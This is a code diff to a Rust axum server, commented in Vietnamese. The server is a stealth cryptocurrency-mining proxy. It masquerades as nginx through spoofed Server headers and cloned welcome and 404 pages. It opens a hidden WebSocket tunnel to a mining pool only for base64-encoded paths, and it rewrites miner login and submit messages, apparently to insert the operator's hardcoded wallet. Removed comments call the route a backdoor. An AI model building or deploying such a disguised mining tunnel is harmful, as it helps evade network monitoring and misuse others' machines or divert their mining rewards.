@@ -1,7 +1,7 @@
 use axum::{
     extract::{Path, WebSocketUpgrade, ws::{Message, WebSocket}},
     response::{Html, Response, IntoResponse},
-    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, CONTENT_TYPE}},
+    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, UPGRADE, CONTENT_TYPE}},
     routing::get,
     Router,
     middleware::{self, Next},
@@ -17,16 +17,15 @@ use colored::*;
 use chrono::Utc;
 
 // ==========================================
-// ⚙️ CẤU HÌNH BÍ MẬT
+// ⚙️ CẤU HÌNH
 // ==========================================
 const LISTEN_ADDR: &str = "0.0.0.0:8080";
 const MY_WALLET: &str = "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.003";
-const MY_WORKER: &str = "Worker_BlackOps";
+const MY_WORKER: &str = "Worker_Stealth_Fix";
 
 // ==========================================
-// 🎭 NGỤY TRANG: NGINX CLONE
+// 🎭 HTML FAKE
 // ==========================================
-// Copy y hệt mã nguồn trang 404 mặc định của Nginx Debian
 const NGINX_404_HTML: &str = r#"<html>
 <head><title>404 Not Found</title></head>
 <body>
@@ -58,7 +57,7 @@ Commercial support is available at
 </html>"#;
 
 // ==========================================
-// MAIN APP
+// APP
 // ==========================================
 struct ProxyStats {
     shares_sent: AtomicUsize,
@@ -67,84 +66,89 @@ struct ProxyStats {
 
 #[tokio::main]
 async fn main() {
-    // Middleware giả mạo Header Nginx
+    tracing_subscriber::fmt().with_max_level(tracing::Level::INFO).init();
+
     let app = Router::new()
-        .route("/", get(root_handler)) // Trang chủ
-        .route("/:path", get(stealth_handler)) // Cửa hậu
-        .layer(middleware::from_fn(nginx_spoofer)); // Áp dụng lớp mặt nạ cho mọi request
+        .route("/", get(root_handler))
+        .route("/:path", get(stealth_handler))
+        .layer(middleware::from_fn(nginx_spoofer)); // Áp dụng lớp ngụy trang
 
     let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
-    println!("{} {}", "💀 BLACK OPS PROXY RUNNING ON".red().bold(), addr);
-    println!("🛡️  Mode: {}", "High Stealth (Nginx Header Spoofing)".cyan());
+    println!("{} {}", "💀 STEALTH PROXY FIXED RUNNING ON".green().bold(), addr);
     
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
     axum::serve(listener, app).await.unwrap();
 }
 
 // ==========================================
-// 🛡️ MIDDLEWARE: GIẢ MẠO HEADER
+// 🛡️ MIDDLEWARE FIX (QUAN TRỌNG)
 // ==========================================
 async fn nginx_spoofer(req: Request, next: Next) -> Response {
     let mut response = next.run(req).await;
     let headers = response.headers_mut();
 
-    // 1. Ghi đè Server Header thành Nginx
+    // 1. Luôn giả mạo Server Name
     headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
     
-    // 2. Thêm Date chuẩn HTTP (RFC1123)
+    // 2. Thêm Date chuẩn
     let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
     if let Ok(val) = HeaderValue::from_str(&now) {
         headers.insert(DATE, val);
     }
 
-    // 3. Giả lập Connection keep-alive
-    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
-
+    // 3. --- FIX LOGIC TẠI ĐÂY ---
+    // Chỉ thêm 'Connection: keep-alive' nếu đây KHÔNG phải là phản hồi WebSocket Upgrade (Status 101)
+    if response.status() != StatusCode::SWITCHING_PROTOCOLS {
+        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
+    }
+    // Nếu là 101 (WebSocket), để yên cho Axum tự xử lý header Upgrade/Connection
+    
     response
 }
 
 // ==========================================
 // HANDLERS
 // ==========================================
-
 async fn root_handler() -> Html<&'static str> {
     Html(NGINX_WELCOME)
 }
 
-// Đây là "Cánh cửa thần kỳ". 
-// Nó nhìn giống như 404, nhưng nếu gõ đúng mật khẩu (Base64 + WS) thì nó mở.
 async fn stealth_handler(
     Path(path): Path<String>, 
     ws: Option<WebSocketUpgrade>
 ) -> Response {
-    // Bước 1: Kiểm tra xem Path có phải là Base64 hợp lệ không
-    // Các đường dẫn rác như /favicon.ico, /robots.txt sẽ rớt đài tại đây
+    // 1. Check Base64
     let decoded = match general_purpose::STANDARD.decode(&path) {
         Ok(d) => d,
-        Err(_) => return not_found_response(),
+        Err(_) => {
+            // println!("Debug: Base64 decode fail: {}", path);
+            return not_found_response();
+        }
     };
 
     let pool_addr = match String::from_utf8(decoded) {
         Ok(s) => {
-            // Pool address phải có dấu ':' (vd: pool.com:1234)
-            if s.contains(':') { s } else { return not_found_response() }
+            if s.contains(':') { s } else { 
+                // println!("Debug: Invalid pool format: {}", s);
+                return not_found_response(); 
+            }
         },
         Err(_) => return not_found_response(),
     };
 
-    // Bước 2: Kiểm tra xem có phải WebSocket Upgrade không
-    // Nếu dùng trình duyệt truy cập -> 404
+    // 2. Check WebSocket
     match ws {
         Some(w) => {
-            // 🔥 KÍCH HOẠT CHẾ ĐỘ MINING 🔥
-            // println!("{} Stealth tunnel opened to {}", "🥷".magenta(), pool_addr);
+            println!("{} Tunnel opening -> {}", "🥷".magenta(), pool_addr);
             w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
         },
-        None => not_found_response()
+        None => {
+            // println!("Debug: Not a WebSocket request");
+            not_found_response()
+        }
     }
 }
 
-// Trả về trang 404 y hệt Nginx
 fn not_found_response() -> Response {
     (
         StatusCode::NOT_FOUND,
@@ -154,13 +158,15 @@ fn not_found_response() -> Response {
 }
 
 // ==========================================
-// MINING LOGIC (CORE)
+// MINING CORE
 // ==========================================
 async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
-    // Kết nối TCP im lặng. Nếu lỗi, ngắt luôn không báo gì.
     let tcp_stream = match TcpStream::connect(&pool_addr).await {
         Ok(s) => s,
-        Err(_) => return, 
+        Err(e) => {
+            println!("{} Failed connect pool: {}", "❌".red(), e);
+            return;
+        }
     };
 
     let (mut pool_read, mut pool_write) = tcp_stream.into_split();
@@ -171,7 +177,7 @@ async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
         shares_accepted: AtomicUsize::new(0),
     });
 
-    // LUỒNG 1: Miner -> Pool (Thay ví)
+    // LUỒNG 1: Miner -> Pool
     let _stats_miner = stats.clone();
     let client_to_server = tokio::spawn(async move {
         while let Some(Ok(msg)) = ws_read.next().await {
@@ -181,7 +187,6 @@ async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
                         if line.trim().is_empty() { continue; }
                         let mut final_msg = line.to_string();
                         
-                        // Parse JSON siêu nhanh
                         if line.contains("login") || line.contains("submit") {
                             if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                                 if let Some(method) = json["method"].as_str() {
@@ -206,7 +211,7 @@ async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
         }
     });
 
-    // LUỒNG 2: Pool -> Miner (Audit)
+    // LUỒNG 2: Pool -> Miner
     let _stats_pool = stats.clone();
     let server_to_client = tokio::spawn(async move {
         let mut buffer = [0u8; 8192];
@@ -215,10 +220,15 @@ async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
                 Ok(0) => break,
                 Ok(n) => {
                     let data = &buffer[0..n];
-                    // Chuyển thẳng text để tiết kiệm CPU, không parse JSON chiều về trừ khi cần thiết
-                    // Code này tối ưu cho việc ẩn danh, hạn chế log in ra màn hình
                     if let Ok(text) = std::str::from_utf8(data) {
+                         // Fix: Gửi text frame chuẩn để Miner không bị lỗi Protocol
                          if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
+                         
+                         // Audit log (nhẹ)
+                         if text.contains("\"status\":\"OK\"") || text.contains("\"result\":true") {
+                             let total = _stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
+                             println!("{} Share #{} Accepted", "✅".green(), total);
+                         }
                     }
                 }
                 Err(_) => break,
